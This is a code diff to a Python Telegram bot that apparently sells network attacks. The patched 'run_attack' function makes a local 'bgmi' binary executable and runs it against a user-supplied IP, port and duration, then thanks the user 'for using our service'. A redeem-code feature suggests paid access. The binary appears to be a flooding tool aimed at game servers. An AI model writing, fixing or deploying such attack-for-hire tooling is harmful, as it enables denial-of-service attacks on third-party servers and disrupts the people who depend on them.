@@ -157,24 +157,49 @@ async def attack(update: Update, context: CallbackContext):
 
 async def run_attack(chat_id, ip, port, duration, context):
     try:
-        process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {duration} 900",
+        import os
+
+        # ✅ 1. Permission fix (MOST IMPORTANT)
+        os.system("chmod +x bgmi")
+
+        # ✅ 2. File exist check (debug ke liye)
+        if not os.path.exists("bgmi"):
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text="*❌ bgmi file not found!*",
+                parse_mode='Markdown'
+            )
+            return
+
+        # ✅ 3. Run process safely
+        process = await asyncio.create_subprocess_exec(
+            "./bgmi", ip, port, duration, "900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
+
         stdout, stderr = await process.communicate()
 
+        # ✅ 4. Debug output (Railway logs me dikhega)
         if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
+            print("[stdout]\n", stdout.decode())
+
         if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
+            print("[stderr]\n", stderr.decode())
 
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"*⚠️ Error during attack:* `{str(e)}`",
+            parse_mode='Markdown'
+        )
 
     finally:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
-
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*",
+            parse_mode='Markdown'
+        )
 # Function to generate a redeem code with a specified redemption limit and optional custom code name
 async def generate_redeem_code(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
